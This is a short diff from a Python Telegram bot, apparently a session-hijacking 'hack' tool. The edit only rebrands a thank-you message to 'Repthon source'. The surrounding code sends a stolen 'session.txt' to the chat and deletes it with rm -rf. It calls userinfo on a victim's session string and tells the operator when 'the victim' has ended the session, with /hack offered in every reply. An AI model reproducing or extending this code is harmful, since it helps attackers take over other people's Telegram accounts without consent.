@@ -277,7 +277,7 @@ async def users(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس ريبثون ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس ريبـــثون ❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -290,7 +290,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس ريبـــثون ❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
